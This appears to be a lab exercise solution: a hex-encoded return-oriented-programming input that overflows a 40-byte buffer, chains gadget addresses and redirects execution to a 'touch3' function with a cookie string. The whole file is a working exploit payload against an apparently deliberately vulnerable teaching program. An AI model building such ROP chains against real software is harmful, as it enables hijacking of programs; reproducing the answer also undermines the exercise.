/* 40 bytes to cause buffer overflow */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00

/* Gadget 1 */
06 1a 40 00 00 00 00 00

/* Gadget 2 */
a2 19 40 00 00 00 00 00

/* Gadget 3 */
ab 19 40 00 00 00 00 00

/* Offset */
48 00 00 00 00 00 00 00

/* Gadget 4 */
42 1a 40 00 00 00 00 00

/* Gadget 5 */
69 1a 40 00 00 00 00 00

/* Gadget 6 */
27 1a 40 00 00 00 00 00

/* Gadget 7 */
d6 19 40 00 00 00 00 00

/* Gadget 8 */
a2 19 40 00 00 00 00 00

/* Address of `touch3` */
fa 18 40 00 00 00 00 00

/* Cookie string */
35 39 62 39 39 37 66 61 00